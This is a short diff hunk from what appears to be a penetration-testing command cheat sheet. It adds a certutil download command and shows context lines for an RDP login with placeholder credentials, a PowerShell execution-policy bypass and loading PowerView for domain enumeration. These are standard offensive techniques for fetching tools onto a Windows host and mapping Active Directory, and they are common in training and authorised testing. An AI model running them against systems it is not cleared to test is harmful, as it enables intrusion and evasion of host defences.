@@ -87,6 +87,8 @@ xfreerdp /u:USER /p:PASS /cert:ignore /v:RHOST
 
 git clone https://github.com/melnicek/peh
 
+certutil.exe -urlcache -split -f "URL" OUTFILE
+
 powershell -ep bypass
 
 . .\PowerView.ps1
